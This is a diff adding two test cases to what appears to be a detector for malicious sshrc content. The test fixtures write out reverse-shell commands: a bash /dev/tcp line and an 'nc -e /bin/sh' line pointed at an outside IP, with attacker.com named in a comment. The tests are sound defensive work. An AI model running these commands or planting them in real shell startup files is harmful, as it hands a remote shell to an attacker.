@@ -224,3 +224,29 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (sample names offending file in JSON — operator triage routing)" {
+    # When an injection-pattern alert fires, sample MUST surface the
+    # file path so operator dashboard routes triage to the right
+    # path (sister contract: polkit-rules/nfs-exports/rhosts/tmpfiles
+    # /securetty sample-naming pattern).
+    USERRC="${TMP}/user-distinctive-attacker.rc"
+    seed_benign
+    FILES_V="${SSHRC} ${USERRC}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# .ssh/rc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${USERRC}"
+    FILES_V="${SSHRC} ${USERRC}" run_wd
+    cap | grep -q 'user-distinctive-attacker'
+}
+
+@test "INVARIANT (nc reverse-shell variant: netcat-listening pipe also detected — sister to bash -i /dev/tcp axis)" {
+    # netcat reverse shells (nc -e /bin/sh attacker.com 4444) are a
+    # canonical RCE primitive. Lock detection alongside the bash
+    # /dev/tcp variant.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# sshrc\nnc -e /bin/sh 1.1.1.1 4444\n' > "${SSHRC}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
